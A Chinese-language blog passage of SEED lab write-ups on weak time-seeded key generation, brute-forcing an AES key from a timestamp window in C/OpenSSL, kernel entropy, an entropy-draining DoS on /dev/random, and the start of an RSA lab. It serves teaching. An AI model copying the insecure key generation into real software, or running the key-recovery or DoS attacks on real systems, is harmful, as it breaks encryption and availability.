    <content type="html"><![CDATA[<h1 id="Task-1-Generate-Encryption-Key-in-a-Wrong-Way"><a href="#Task-1-Generate-Encryption-Key-in-a-Wrong-Way" class="headerlink" title="Task 1: Generate Encryption Key in a Wrong Way"></a>Task 1: Generate Encryption Key in a Wrong Way</h1><ul><li>   使用当前时间作为伪随机数生成器的种子，生成一个128位的加密秘钥</li><li>  用 <code>time</code>函数来获得系统时间，它的返回值为从<code> 00:00:00 GMT, January 1, 1970</code> 到现在所持续的秒数</li><li>  <code>rand()</code>配合<code>srand()</code>函数进行使用，当<code>srand()</code>的参数值固定的时候，<code>rand()</code>获得的数也是固定的，它返回一个范围在 0 到 <code>RAND_MAX </code>之间的伪随机数。所以一般<code>srand</code>的参数用<code>time(NULL)</code>，因为系统的时间一直在变，所以<code>rand()</code>返回的数，也就一直在变，相当于是随机数</li></ul><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEYSIZE 16</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i;<br><span class="hljs-keyword">char</span> key[KEYSIZE];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld\n&quot;</span>, (<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>)time(<span class="hljs-literal">NULL</span>));<br>srand(time(<span class="hljs-literal">NULL</span>)); <br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; KEYSIZE; i++) &#123;<br>key[i] = rand() % <span class="hljs-number">256</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)key[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>); <br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ ./a.out <br><span class="hljs-number">1665748464</span><br>bba0f21c1012ceb31df267e5b<span class="hljs-number">673d461</span><br></code></pre></td></tr></table></figure><h1 id="Task-2-Guessing-the-Key"><a href="#Task-2-Guessing-the-Key" class="headerlink" title="Task 2: Guessing the Key"></a>Task 2: Guessing the Key</h1><p>已知：</p><ul><li>加密文件的时间戳是“2018-04-1723:08:49”</li><li>以时间为基础生成的秘钥可能在前两个小时内生成</li><li>文件头以% PDF-1.5开头</li><li><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Plaintext</span>: <span class="hljs-number">255044462</span>d<span class="hljs-number">312</span>e<span class="hljs-number">350</span>a<span class="hljs-number">25</span>d<span class="hljs-number">0</span>d<span class="hljs-number">4</span>c<span class="hljs-number">5</span>d<span class="hljs-number">80</span>a<span class="hljs-number">34</span><br><span class="hljs-attribute">Ciphertext</span>: d<span class="hljs-number">06</span>bf<span class="hljs-number">9</span>d<span class="hljs-number">0</span>dab<span class="hljs-number">8</span>e<span class="hljs-number">8</span>ef<span class="hljs-number">880660</span>d<span class="hljs-number">2</span>af<span class="hljs-number">65</span>aa<span class="hljs-number">82</span><br><span class="hljs-attribute">IV</span>: <span class="hljs-number">09080706050403020100</span>A<span class="hljs-number">2</span>B<span class="hljs-number">2</span>C<span class="hljs-number">2</span>D<span class="hljs-number">2</span>E<span class="hljs-number">2</span>F<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure></li></ul><p>思路：</p><ul><li>  计算出时间的区间，时间作为随机种子</li><li>  使用AES算法进行枚举</li><li>  将结果与目标字符串进行匹配即可</li><li>  <strong>需要着重注意的点：每次执行<code>AES_cbc_encrypt</code>后，初始向量会被更新， 所以需要保存初始向量（在这个地方被卡了一次）</strong></li></ul><p>在Linux C中使用OpenSSL的一些前置知识：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> AES_ENCRYPT     1</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> AES_DECRYPT     0</span><br><br><span class="hljs-comment">//设置加密密钥，使用字符缓冲区  </span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">AES_set_encrypt_key</span><span class="hljs-params">(  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *userKey,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> bits,  </span></span><br><span class="hljs-params"><span class="hljs-function">        AES_KEY *key)</span></span>;  <br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">AES_set_decrypt_key</span><span class="hljs-params">(  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *userKey,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> bits,  </span></span><br><span class="hljs-params"><span class="hljs-function">        AES_KEY *key)</span></span>;  <br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">AES_cbc_encrypt</span><span class="hljs-params">(  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *in,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *out,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> length,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> AES_KEY *key,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *ivec,  </span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> enc)</span></span>;  <br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">参数名称</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">in</td><td align="left">输入数据，长度任意</td></tr><tr><td align="left">out</td><td align="left">输出数据，能够容纳下输入数据，且长度必须是16字节的倍数。</td></tr><tr><td align="left">length</td><td align="left">输入数据的实际长度。</td></tr><tr><td align="left">key</td><td align="left">使用AES_set_encrypt_key/AES_set_decrypt_key生成的Key</td></tr><tr><td align="left">ivec</td><td align="left">可读写的一块内存。长度必须是16字节。</td></tr><tr><td align="left">enc</td><td align="left">AES_ENCRYPT 代表加密， AES_DECRYPT代表解密</td></tr></tbody></table><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/aes.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KEYSIZE 16</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i,j;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> encryptText[<span class="hljs-number">17</span>];<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> plainText[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;\x25\x50\x44\x46\x2d\x31\x2e\x35\x0a\x25\xd0\xd4\xc5\xd8\x0a\x34&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> target_str[<span class="hljs-number">17</span>] = <span class="hljs-string">&quot;\xd0\x6b\xf9\xd0\xda\xb8\xe8\xef\x88\x06\x60\xd2\xaf\x65\xaa\x82&quot;</span>;<br><span class="hljs-keyword">int</span> target_time = <span class="hljs-number">1524020929</span>;<br><span class="hljs-keyword">for</span> (i = target_time;i &gt;=target_time - <span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">2</span> ; i--)<br>&#123;<br>srand(i);<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> key[KEYSIZE];<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> ini_vec[<span class="hljs-number">17</span>] =  <span class="hljs-string">&quot;\x09\x08\x07\x06\x05\x04\x03\x02\x01\x00\xA2\xB2\xC2\xD2\xE2\xF2&quot;</span>;<br><span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; KEYSIZE; j++) <br>&#123;<br>key[j] = rand() % <span class="hljs-number">256</span>;<br><span class="hljs-comment">//printf(&quot;%.2x&quot;, (unsigned char)key[j]);</span><br>&#125;<br>AES_KEY enc_key;<br>AES_set_encrypt_key(key, <span class="hljs-number">128</span> , &amp;enc_key);<br>AES_cbc_encrypt(plainText, encryptText, <span class="hljs-number">16</span> , &amp;enc_key, ini_vec, AES_ENCRYPT);     <span class="hljs-comment">// 加密</span><br><br><span class="hljs-keyword">int</span> flag=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">16</span>;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(encryptText[j]!=target_str[j])<br>&#123;<br>flag=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(flag)<br>&#123;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot;the key is : &quot;</span>;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">16</span>;j++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x&quot;</span>, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>)key[j]);<br>&#125;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-comment">//return 0;</span><br>&#125;<br><br>&#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Task-3-Measure-the-Entropy-of-Kernel"><a href="#Task-3-Measure-the-Entropy-of-Kernel" class="headerlink" title="Task 3: Measure the Entropy of Kernel"></a>Task 3: Measure the Entropy of Kernel</h1><p>以下行为可以增加熵：</p><ul><li>  移动、点击鼠标</li><li>  敲击键盘</li><li>  切换任务，运行程序</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_keyboard_randomness</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> scancode)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_mouse_randomness</span><span class="hljs-params">(__u32 mouse_data)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_interrupt_randomness</span><span class="hljs-params">(<span class="hljs-keyword">int</span> irq)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_blkdev_randomness</span><span class="hljs-params">(<span class="hljs-keyword">int</span> major)</span></span>;<br></code></pre></td></tr></table></figure><p>使用以下命令查找内核当前的熵值（不同于信息论中熵的含义。在这里，它仅仅意味着系统当前有多少位随机数）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">watch -n <span class="hljs-number">.1</span> cat /proc/sys/kernel/random/entropy_avail<br></code></pre></td></tr></table></figure><h1 id="Task-4-Get-Pseudo-Random-Numbers-from-dev-random"><a href="#Task-4-Get-Pseudo-Random-Numbers-from-dev-random" class="headerlink" title="Task 4: Get Pseudo Random Numbers from /dev/random"></a>Task 4: Get Pseudo Random Numbers from /dev/random</h1><h2 id="关于熵："><a href="#关于熵：" class="headerlink" title="关于熵："></a>关于熵：</h2><ul><li><p>  Linux内核采用熵来描述数据的随机性</p></li><li><p>  熵是描述系统混乱无序程度的物理量，一个系统的熵越大则说明该系统的有序性越差，即不确定性越大</p></li><li><p>  <code>/dev/random</code>是阻塞的，<code>/dev/urandom</code>是“unblocked”，非阻塞的随机数发生器</p></li></ul><p><strong>可以使用以下指令获得读取伪随机数并用<code>hexdump</code>  打印：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /dev/random | hexdump</span><br></code></pre></td></tr></table></figure><ul><li><p>  如果不作任何操作，熵值缓慢稳定增加（或许是因为时间）</p></li><li><p>  如果点击鼠标或者操作键盘等操作，熵值快速增加 </p></li><li><p>  触发产生随机数的熵值大小为为 64，每次产生一个随机数都会降低熵值，如果低于64则不会产生随机数</p></li><li><p>  若熵池空了，对<code>/dev/random</code>的读操作将会被阻塞，直到收集到了足够的环境噪声为止</p></li></ul><h2 id="Q：a-server-uses-dev-random-to-generate-the-random-session-key-with-a-client-Please-escribe-how-you-can-launch-a-Denial-Of-Service-DOS-attack-on-such-a-server"><a href="#Q：a-server-uses-dev-random-to-generate-the-random-session-key-with-a-client-Please-escribe-how-you-can-launch-a-Denial-Of-Service-DOS-attack-on-such-a-server" class="headerlink" title="Q：a server uses /dev/random to generate the random session key with a client. Please escribe how you can launch a Denial-Of-Service (DOS) attack on such a server."></a>Q：a server uses /dev/random to generate the random session key with a client. Please escribe how you can launch a Denial-Of-Service (DOS) attack on such a server.</h2><ul><li>  使得server无法产生序列号即可</li><li>  <code>/dev/random</code>如果没有足够的可用熵，读取将在某些系统上阻塞</li><li>  通过创建大量会话 id 快速从系统中降低熵，导致<code>/dev/random</code>阻塞，从而使得正常的序列号无法产生</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">$ head -c <span class="hljs-number">1</span>M /dev/urandom &gt; output.bin<br>$ ent output.bin<br></code></pre></td></tr></table></figure><ul><li><p>  Entropy = 7.999845 bits per byte.</p></li><li><p>  最佳压缩会将这个 1048576 字节文件的大小减少 0%。</p></li><li><p>  1048576 个样本的卡方分布为 225.47，随机超过该值的概率为 90.86%。</p></li><li><p>  数据字节的算术平均值为 127.4740（127.5 = 随机）</p></li><li><p>  Pi 的蒙特卡罗值为 3.145969948（误差 0.14%）</p></li><li><p>  序列相关系数为 0.000297（完全不相关 = 0.0）</p></li><li><p>  综上，生成随机数质量是很好的</p></li></ul><h1 id="Task-5-Get-Random-Numbers-from-dev-urandom"><a href="#Task-5-Get-Random-Numbers-from-dev-urandom" class="headerlink" title="Task 5: Get Random Numbers from /dev/urandom"></a>Task 5: Get Random Numbers from /dev/urandom</h1><p>Linux 提供了通过<code>/dev/urandom</code> 设备访问随机池的另一种方法，只是这个设备不会阻塞。/dev/Random 和<code>/dev/urandom</code> 都使用池中的随机数据来生成伪随机数。当熵不足时,<code>/dev/Random</code> 将暂停，而<code>/dev/urandom</code> 将继续生成新的数字</p><ul><li>  <code>/dev/urandom</code>的u指的是“unblocked”，不会被阻塞</li><li>  运行指令，会不断地打印输出</li></ul><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/aes.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LEN 32 <span class="hljs-comment">// 256 bits</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* key = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> * ) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>) * LEN);<br>FILE * random = fopen(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>fread(key, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>) * LEN, <span class="hljs-number">1</span>, random);<br>fclose(random);<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;LEN;i++)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x&quot;</span>,key[i]);<br>&#125;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：RSA Public-Key Encryption and Signature Lab</title>
    <link href="/p/383dc23/"/>
    <url>/p/383dc23/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/seed/rsaflow.jpg"></p><h1 id="写在lab之前"><a href="#写在lab之前" class="headerlink" title="写在lab之前"></a>写在lab之前</h1><h2 id="RSA算法的数学解释"><a href="#RSA算法的数学解释" class="headerlink" title="RSA算法的数学解释"></a>RSA算法的数学解释</h2><ul><li>  随机选择两个不相同的素数 $p, q$ 。</li><li>  $p, q$ 将相乘, 为 $n=p \times q$ 。</li><li>  计算 $\mathrm{n}$ 的欧拉函数 $\varphi(\mathrm{n})$, 欧拉函数证明, 当 $p, q$ 为不相同的素数时,$\varphi(n)=(p-1)(q-1) 。$</li><li>  随机选择一个整数 $\mathrm{e}$, 满足两个条件: $\varphi(n)$ 与 $\mathrm{e}$ 质,且 $1&lt;e&lt;\varphi(n)$ 。</li><li>  计算 $\mathrm{e}$ 对于 $p(n)$ 的逆元 $\mathrm{d}$, 也就是说找到一个 $\mathrm{d}$ 满足 $e d=1 \bmod \varphi(n)$ 。</li><li>  这个式子等价于 $e d-1=k \varphi(n)$, 实际上就是对于方程 $e d-k \varphi(n)=1$求 $(d, k)$ 的整数解。这个方程可以用扩展欧几里得算法求解。</li><li>  最终把 $(e, n)$ 封装成公钥， $(d, n)$ 封装成私钥。</li><li>  <strong>公钥加密，私钥解密</strong></li><li>  <strong>私钥签名，公钥验证</strong></li></ul><p>对于大数运算，不能使用C语言基本的数据类型，而是要使用 openssl 提供的 big num library，我们将把每个大数定义为一个 BIGNUM 类型，然后使用库提供的 API 进行各种操作，如加法、乘法、求幂、模块化操作等，big number APIs可以在 <a href="https://linux.die.net/man/3/bn">https://linux.die.net/man/3/bn</a> 找到</p><p><code>BN_CTX</code> 是一个结构体，用于存储大数运算时用到的临时变量。通过动态分配内存方式创建<code>BIGNUM</code>的开销比较大，所以使用 <code>BN_CTX </code>来提高效率。</p><p>代码的具体实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//动态分配并初始化一个 BIGNUM 结构体</span><br><span class="hljs-function">BIGNUM *<span class="hljs-title">BN_new</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-comment">//ossl_typ.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bignum_st</span> &#123;</span><br>         BN_ULONG *d;<br>         <span class="hljs-keyword">int</span> top;<br>         <span class="hljs-keyword">int</span> dmax;<br>         <span class="hljs-keyword">int</span> neg;<br>         <span class="hljs-keyword">int</span> flags;<br>&#125;;<br><br><span class="hljs-comment">// bn_lcl.h </span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bignum_st</span> <span class="hljs-title">BIGNUM</span>;</span><br></code></pre></td></tr></table></figure><ul><li>  编译命令</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gcc cr.c -lcrypto<br></code></pre></td></tr></table></figure><ul><li><p>使用<code>BIGNUM</code>库进行很多位的大数操作</p><ul><li><p>模意义下的幂运算</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">BN_mod_exp(res, a, c, n, ctx)<br></code></pre></td></tr></table></figure></li><li><p>两个大数相乘</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//Compute res = a ∗ b. It should be noted that a BN CTX structure is need in this API</span><br>BN_mul(res, a, b, ctx)<br></code></pre></td></tr></table></figure></li><li><p>求逆元</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//Compute modular inverse, i.e., given a, find b, such that a ∗ b mod n = 1. The value b is called the inverse of a, with respect to modular n</span><br>BN_mod_inverse(b, a, n, ctx)<br></code></pre></td></tr></table></figure><p>在labPDF中，有着更多的使用范例</p></li></ul></li></ul><h1 id="3-1-Task-1-Deriving-the-Private-Key"><a href="#3-1-Task-1-Deriving-the-Private-Key" class="headerlink" title="3.1 Task 1: Deriving the Private Key"></a>3.1 Task 1: Deriving the Private Key</h1><p>设 p，q，e 是三个质数。设 n = p * q。我们将使用(e，n)作为公钥，请计算私钥 d。p、q 和 e 的十六进制值如下所示</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">p</span> = F<span class="hljs-number">7</span>E<span class="hljs-number">75</span>FDC<span class="hljs-number">469067</span>FFDC<span class="hljs-number">4</span>E<span class="hljs-number">847</span>C<span class="hljs-number">51</span>F<span class="hljs-number">452</span>DF<br><span class="hljs-attribute">q</span> = E<span class="hljs-number">85</span>CED<span class="hljs-number">54</span>AF<span class="hljs-number">57</span>E<span class="hljs-number">53</span>E<span class="hljs-number">092113</span>E<span class="hljs-number">62</span>F<span class="hljs-number">436</span>F<span class="hljs-number">4</span>F<br><span class="hljs-attribute">e</span> = <span class="hljs-number">0</span>D<span class="hljs-number">88</span>C<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>原理可见前面<strong>RSA算法的数学解释</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;openssl/bn.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NBITS 256</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BN_CTX *ctx = BN_CTX_new();<br>    BIGNUM *p = BN_new();<br>    BIGNUM *p_1 = BN_new();<br>    BIGNUM *q = BN_new();<br>    BIGNUM *q_1 = BN_new();<br>    BIGNUM *e = BN_new();<br>    BIGNUM *d = BN_new();<br>    BIGNUM *n = BN_new();<br>    BIGNUM *phi_n = BN_new();<br>    BIGNUM *res = BN_new();<br>    BIGNUM *one = BN_new();<br>    <span 